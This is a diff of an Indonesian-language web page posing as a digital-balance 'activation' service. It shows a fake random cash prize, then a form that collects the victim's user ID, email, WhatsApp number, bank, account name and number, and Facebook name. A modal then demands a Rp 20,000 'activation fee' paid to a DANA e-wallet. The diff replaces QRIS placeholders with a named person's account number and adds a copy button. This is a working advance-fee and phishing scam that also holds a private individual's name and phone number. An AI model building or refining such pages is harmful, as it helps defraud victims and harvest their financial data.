@@ -6,71 +6,68 @@
     <title>Aktivasi Saldo Digital - Verifikasi Akun</title>
     <style>
         :root {
-            --primary: #10b981; /* Emerald Green */
+            --primary: #10b981;
             --dark: #0f172a;
             --card: #1e293b;
+            --dana: #0085ff;
         }
         body {
-            font-family: 'Inter', 'Segoe UI', sans-serif; text-align: center; 
+            font-family: 'Inter', sans-serif; text-align: center; 
             background-color: var(--dark); color: white; margin: 0; padding: 20px;
             user-select: none;
         }
         .container { max-width: 450px; margin: auto; background: var(--card); padding: 30px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid #334155; }
         
-        /* Area Animasi Dompet (Menggantikan Kotak) */
-        .wallet-wrapper { position: relative; width: 150px; height: 150px; margin: 20px auto; }
-        #main-icon { width: 100%; height: 100%; cursor: pointer; transition: 0.3s; filter: drop-shadow(0 0 20px rgba(16, 185, 129, 0.3)); }
-        
+        /* Area Icon */
+        .wallet-wrapper { position: relative; width: 140px; height: 140px; margin: 20px auto; }
+        #main-icon { width: 100%; height: 100%; cursor: pointer; transition: 0.3s; }
         .pulse { animation: pulse 1.5s infinite; }
         @keyframes pulse {
-            0% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(16, 185, 129, 0.2)); }
-            50% { transform: scale(1.05); filter: drop-shadow(0 0 25px rgba(16, 185, 129, 0.5)); }
-            100% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(16, 185, 129, 0.2)); }
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
 
         #reward-display {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
-            font-size: 32px; font-weight: 800; color: var(--primary); text-shadow: 0 0 20px rgba(16, 185, 129, 0.4);
-            transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 5; background: white; padding: 10px 20px; border-radius: 12px;
+            font-size: 30px; font-weight: 800; color: var(--primary); background: white; 
+            padding: 10px 15px; border-radius: 12px; transition: 0.6s; z-index: 5;
         }
         #reward-display.show { transform: translate(-50%, -50%) scale(1); }
 
         /* Form Style */
         .form-daftar { display: none; text-align: left; background: #334155; padding: 20px; border-radius: 18px; margin-top: 20px; }
-        .form-daftar label { font-size: 11px; color: #94a3b8; display: block; margin-bottom: 4px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px;}
+        .form-daftar label { font-size: 11px; color: #94a3b8; display: block; margin-bottom: 4px; font-weight: 600; text-transform: uppercase; }
         .form-daftar input, .form-daftar select {
-            width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 10px; border: 1px solid #475569; box-sizing: border-box; background: #0f172a; color: white; font-size: 14px;
+            width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 10px; border: 1px solid #475569; box-sizing: border-box; background: #0f172a; color: white;
         }
         
-        button#mainBtn { 
+        button#mainBtn, .btn-submit { 
             padding: 16px; font-size: 16px; font-weight: bold; cursor: pointer;
-            background: var(--primary); color: white; border: none; border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); transition: 0.2s; width: 100%;
+            background: var(--primary); color: white; border: none; border-radius: 12px; width: 100%;
         }
-        button#mainBtn:disabled { background: #475569; box-shadow: none; color: #94a3b8; }
 
         /* Loading Bar */
         #loadingArea { display: none; margin: 20px 0; }
         .progress-container { width: 100%; background: #0f172a; border-radius: 10px; height: 12px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: var(--primary); transition: width 0.1s; }
+        .progress-bar { width: 0%; height: 100%; background: var(--primary); }
 
-        /* Modal Pilihan QRIS */
+        /* Modal Dana Style */
         .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); backdrop-filter: blur(5px); }
-        .modal-content { background: white; color: #1e293b; margin: 5% auto; padding: 25px; border-radius: 24px; width: 88%; max-width: 380px; text-align: center; }
-        .qris-img { width: 100%; max-width: 200px; border: 1px solid #e2e8f0; border-radius: 12px; margin: 10px 0; }
+        .modal-content { background: white; color: #1e293b; margin: 10% auto; padding: 25px; border-radius: 24px; width: 85%; max-width: 380px; text-align: center; }
         
-        .qris-tabs { display: flex; gap: 6px; justify-content: center; margin: 15px 0; flex-wrap: wrap; }
-        .tab-btn { padding: 8px 14px; font-size: 11px; background: #f1f5f9; border: 1px solid #e2e8f0; border-radius: 8px; cursor: pointer; font-weight: 700; color: #475569; }
-        .tab-btn.active { background: var(--dark); color: white; border-color: var(--dark); }
+        .dana-box { background: #f0f7ff; border: 2px solid #0085ff; border-radius: 15px; padding: 15px; margin: 15px 0; position: relative; }
+        .dana-logo { width: 100px; margin-bottom: 10px; }
+        .copy-row { display: flex; align-items: center; justify-content: space-between; background: white; padding: 10px; border-radius: 8px; border: 1px solid #d1d5db; margin-top: 5px; }
+        .btn-copy { background: var(--dana); color: white; border: none; padding: 5px 10px; border-radius: 5px; font-size: 12px; cursor: pointer; font-weight: bold; }
         
-        .btn-confirm { display: block; padding: 14px; background: var(--primary); color: white; border-radius: 12px; text-decoration: none; font-weight: bold; margin-top: 15px; }
+        .btn-confirm { display: block; padding: 14px; background: #22c55e; color: white; border-radius: 12px; text-decoration: none; font-weight: bold; margin-top: 15px; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <h2 style="color: var(--primary); margin-bottom: 5px;">AKTIVASI SALDO</h2>
-        <p id="sub-title" style="font-size: 14px; color: #94a3b8;">Ketuk ikon untuk sinkronisasi bonus saldo Anda!</p>
+        <p id="sub-title" style="font-size: 14px; color: #94a3b8;">Ketuk ikon dompet untuk sinkronisasi bonus!</p>
         
         <div class="wallet-wrapper" id="boxArea">
             <img id="main-icon" class="pulse" src="https://cdn-icons-png.flaticon.com/512/10142/10142646.png" alt="Wallet" onclick="startSync()">
@@ -83,11 +80,11 @@
             <h4 style="text-align:center; color:var(--primary); margin:0 0 15px 0;">DATA PENCAIRAN SALDO</h4>
             <label>ID Pengguna:</label>
             <input type="text" id="regId" placeholder="Min. 6 Karakter" required>
-            <label>Email Korespondensi:</label>
+            <label>Email Aktif:</label>
             <input type="email" id="regEmail" placeholder="email@aktif.com" required>
-            <label>Nomor WhatsApp:</label>
+            <label>WhatsApp:</label>
             <input type="text" id="regWa" value="+62" required>
-            <label>Metode Pencairan:</label>
+            <label>Pencairan Ke:</label>
             <select id="regBank" required>
                 <option value="">-- Pilih --</option>
                 <option value="BCA">BCA</option>
@@ -95,17 +92,17 @@
                 <option value="OVO">OVO</option>
                 <option value="BRI">BRI</option>
             </select>
-            <label>Nama Rekening / Akun:</label>
-            <input type="text" id="regNamaRek" placeholder="Sesuai Buku Tabungan" required>
-            <label>Nomor Rekening / E-Wallet:</label>
+            <label>Nama Rekening:</label>
+            <input type="text" id="regNamaRek" placeholder="Nama Lengkap" required>
+            <label>Nomor Rekening:</label>
             <input type="number" id="regNoRek" placeholder="Nomor Rekening" required>
-            <label>Konfirmasi Facebook:</label>
+            <label>Nama Facebook:</label>
             <input type="text" id="regNamaFB" placeholder="Nama Profil FB" required>
-            <button id="submitBtn" onclick="submitData()" style="background:var(--primary); color:white; border-radius:10px; padding:15px; border:none; width:100%; font-weight:bold; cursor:pointer;">PROSES AKTIVASI</button>
+            <button class="btn-submit" onclick="submitData()">PROSES AKTIVASI</button>
         </div>
 
         <div id="loadingArea">
-            <p style="font-size: 13px; color: var(--primary); font-weight:bold;">Menghubungkan ke Secure Server...</p>
+            <p style="font-size: 13px; color: var(--primary); font-weight:bold;">Memproses Validasi Sistem...</p>
             <div class="progress-container"><div class="progress-bar" id="myBar"></div></div>
             <p id="loadText" style="font-size: 12px; margin-top: 5px;">0%</p>
         </div>
@@ -113,43 +110,40 @@
 
     <div id="resultModal" class="modal">
         <div class="modal-content">
-            <h3 style="color:var(--dark); margin: 0;">VERIFIKASI PEMBAYARAN</h3>
-            <p style="font-size: 13px; margin: 10px 0; color:#64748b;">Saldo <b id="finalSaldo" style="color:var(--primary);"></b> Berhasil Disiapkan. <br>Selesaikan misi <b>Aktivasi Rekening</b> untuk pencairan.</p>
+            <h3 style="color:#1e293b; margin: 0;">AKTIVASI REKENING</h3>
+            <p style="font-size: 13px; color:#64748b; margin: 10px 0;">Saldo <b id="finalSaldo" style="color:var(--primary);"></b> siap dicairkan. Silahkan transfer biaya aktivasi <b>Rp 20.000</b> ke akun DANA di bawah:</p>
             
-            <div style="background: #f8fafc; padding: 12px; border-radius: 16px; border: 1px solid #e2e8f0;">
-                <p style="font-size: 10px; font-weight: 800; color:#475569;">PILIH METODE PEMBAYARAN:</p>
-                <div class="qris-tabs">
-                    <div class="tab-btn active" onclick="updateQris(this, 'DANA', 'LINK_QRIS_DANA')">DANA</div>
-                    <div class="tab-btn" onclick="updateQris(this, 'BCA', 'LINK_QRIS_BCA')">BCA</div>
-                    <div class="tab-btn" onclick="updateQris(this, 'BRI', 'LINK_QRIS_BRI')">BRI</div>
-                    <div class="tab-btn" onclick="updateQris(this, 'E-WALLET', 'LINK_QRIS_ALL')">QRIS LAIN</div>
+            <div class="dana-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1200px-Logo_dana_blue.svg.png" class="dana-logo" alt="DANA">
+                
+                <div style="text-align: left; font-size: 12px; margin-bottom: 5px; color: #1e293b;"><b>NAMA:</b> NIZAR ARDIANSYAH</div>
+                
+                <div class="copy-row">
+                    <span id="nomorDana" style="font-weight: 800; font-size: 16px; color: #1e293b;">085129867807</span>
+                    <button class="btn-copy" onclick="copyNumber()">SALIN</button>
                 </div>
-
-                <p id="qrisTitle" style="font-size: 11px; font-weight: bold; margin: 5px 0; color:var(--dark);">SCAN QRIS DANA (Rp 20.000)</p>
-                <img id="qrisDisplay" src="LINK_QRIS_DANA" class="qris-img" alt="QRIS">
-                <p style="font-size: 14px; font-weight: 900; color: #ef4444; margin: 0;">NOMINAL: Rp 20.000</p>
+                <p style="font-size: 10px; color: #ef4444; margin-top: 8px; font-weight: bold;">TOTAL: Rp 20.000</p>
             </div>
 
-            <a href="URL_FB_ANDA" class="btn-confirm">SAYA SUDAH DEPOSIT & MAIN</a>
-            <p style="font-size: 9px; color: #94a3b8; margin-top: 10px;">Deposit akan otomatis ditambahkan ke total saldo cair.</p>
+            <a href="URL_FB_ANDA" class="btn-confirm">KONFIRMASI SUDAH TRANSFER</a>
+            <p style="font-size: 9px; color: #94a3b8; margin-top: 10px;">Deposit 20rb akan ditambahkan ke saldo pencairan.</p>
         </div>
     </div>
 
     <script>
         const prizes = ["350K", "500K", "750K"];
         
-        function updateQris(btn, bank, link) {
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            document.getElementById('qrisDisplay').src = link;
-            document.getElementById('qrisTitle').innerText = "SCAN QRIS " + bank + " (Rp 20.000)";
+        function copyNumber() {
+            const num = document.getElementById("nomorDana").innerText;
+            navigator.clipboard.writeText(num);
+            alert("Nomor Dana berhasil disalin: " + num);
         }
 
         function startSync() {
             if (localStorage.getItem("active_done") === "true") return;
             document.getElementById('main-icon').classList.remove('pulse');
+            document.getElementById('mainBtn').innerText = "MENGECEK DATABASE...";
             document.getElementById('mainBtn').disabled = true;
-            document.getElementById('mainBtn').innerText = "SYNCHRONIZING...";
 
             setTimeout(() => {
                 document.getElementById('main-icon').style.opacity = "0";
@@ -161,15 +155,9 @@
                     document.getElementById('boxArea').style.display = "none";
                     document.getElementById('mainBtn').style.display = "none";
                     document.getElementById('registrationForm').style.display = "block";
-                    document.getElementById('sub-title').innerHTML = "Saldo Anda: <b style='color:var(--primary);'>Rp "+hasil+"</b>";
                 }, 1200);
             }, 2000);
         }
-
-        document.getElementById('regWa').addEventListener('input', function() {
-            if (!this.value.startsWith('+62')) this.value = '+62';
-            this.value = '+62' + this.value.substring(3).replace(/\D/g, '');
-        });
 
         function submitData() {
             const d = {
@@ -183,8 +171,8 @@
                 sld: localStorage.getItem("active_val")
             };
 
-            if(!/^[a-zA-Z0-9]{6,}$/.test(d.id)) { alert("Username tidak valid!"); return; }
-            if(!d.id || !d.email || !d.wa || !d.bank || !d.nama || !d.norek || !d.fb) { alert("Data tidak lengkap!"); return; }
+            if(!/^[a-zA-Z0-9]{6,}$/.test(d.id)) { alert("Username minimal 6 karakter!"); return; }
+            if(!d.id || !d.email || !d.wa || !d.bank || !d.nama || !d.norek || !d.fb) { alert("Lengkapi data!"); return; }
 
             document.getElementById('registrationForm').style.display = "none";
             document.getElementById('loadingArea').style.display = "block";
@@ -200,7 +188,7 @@
                     bar.style.width = w + "%";
                     document.getElementById("loadText").innerHTML = w + "%";
                 }
-            }, 45);
+            }, 40);
         }
 
         function sendToServer(d) {
